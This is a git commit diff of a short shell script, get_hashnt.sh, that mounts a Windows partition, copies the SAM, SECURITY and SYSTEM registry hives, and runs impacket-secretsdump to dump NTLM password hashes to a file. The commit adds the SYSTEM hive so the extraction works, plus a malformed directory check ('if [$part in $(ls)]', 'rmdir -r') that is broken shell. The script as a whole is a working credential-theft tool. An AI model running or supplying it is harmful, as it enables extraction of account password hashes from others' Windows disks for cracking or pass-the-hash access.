019950d2bfa2a5a7ddd9e0821fba2322e63337c2
daisseur <100715068+daisseur@users.noreply.github.com>
2023-07-07 11:40:57 +0200

    Update get_hashnt.sh

--- get_hashnt.sh
+++ get_hashnt.sh
@@ -1,16 +1,20 @@
 configPath="Windows/System32/config"
 if [ -z "$1" ]; then
-part="sda3"
+  part="sda3"
 else
-part=$1
+  part=$1
 fi
 echo "dumping hashnt from $part"
+if [$part in $(ls)]; then
+  sudo rmdir -r /mnt/$part/
+fi
 sudo mkdir /mnt/$part
 sudo mount -o ro /dev/$part /mnt/$part
 mkdir win
 sudo cp /mnt/$part/$configPath/SAM ./win/SAM
 sudo cp /mnt/$part/$configPath/SECURITY ./win/SECURITY
+sudo cp /mnt/$part/$configPath/SYSTEM ./win/SYSTEM
 sudo umount /dev/$part
-sudo apt-get install impacket-secretsdump -y > /dev/null
-sudo impacket-secretsdump -sam ./win/SAM -security ./win/SECURITY LOCAL -just-dc-ntlm > ./win/hashnt
+# sudo apt-get install impacket-secretsdump -y > /dev/null
+sudo impacket-secretsdump -sam ./win/SAM -system ./win/SYSTEM -security ./win/SECURITY LOCAL -just-dc-ntlm > ./win/hashnt
 cat ./win/hashnt
